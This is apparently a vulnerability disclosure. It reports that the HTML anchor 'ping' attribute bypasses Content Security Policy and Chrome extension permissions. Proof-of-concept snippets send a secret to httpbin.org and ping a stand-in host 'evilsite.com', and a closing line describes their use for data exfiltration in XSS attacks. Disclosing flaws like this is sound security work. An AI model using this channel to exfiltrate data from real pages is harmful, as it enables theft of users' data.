The HTML5 Anchor Elements Ping attribute violates both set Content Security Policy and Chrome Extensions manifest permissions settings.
The Ping url is allowed to connect regardless of Content Security Policy as in the example below:

<!DOCTYPE html>
<head>
    <meta http-equiv="Content-Security-Policy" content="default-src 'none';">
</head>
<body>
<a href="#done" ping="http://httpbin.org/post?secret=goes_here">click here to exploit</a>
</body>

Same goes when loaded as an Chrome Extension:

# cat chrome-ext/manifest.json
{
  "manifest_version": 2,

  "name": "ping permission test",
  "description": "ping permission test",
  "version": "0.1",

  "browser_action": {
    "default_icon": "icon.png",
    "default_popup": "popup.html"
  },
  "permissions": [
  ]
}

# cat chrome-ext/popup.html:
<!DOCTYPE html>
<body>
<a href="#done" ping="http://evilsite.com/ping">click here to exploit</a>
</body>

An attacker can use this as a data transportation method as part of an XSS attack on CSP restricted pages or similar.
